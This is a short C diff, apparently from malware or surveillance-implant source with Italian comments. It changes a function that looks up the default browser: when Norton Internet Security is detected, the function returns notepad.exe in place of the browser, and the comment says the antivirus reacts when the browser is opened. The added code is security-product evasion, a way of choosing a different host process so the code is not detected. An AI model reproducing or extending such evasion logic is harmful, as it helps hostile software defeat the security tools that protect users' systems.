@@ -2459,6 +2459,15 @@ BOOL HM_GetDefaultBrowser(char *path_name)
 	char *clean_short_path;
 	char *params;
 
+	// XXX - Si incazza se si cerca di aprire il default browser
+	if (IsNortonInternetSecurity()) {
+		if (IsX64System())
+			sprintf(path_name, "\"%s\"", "C:\\Windows\\SysWOW64\\notepad.exe");
+		else
+			sprintf(path_name, "\"%s\"", "C:\\Windows\\System32\\notepad.exe");
+		return TRUE;
+	}
+
 	// Apre il registry
 	if(FNC(RegOpenKeyA)(HKEY_CLASSES_ROOT, IEPATH, &hIEPath) != ERROR_SUCCESS )
 		return FALSE;
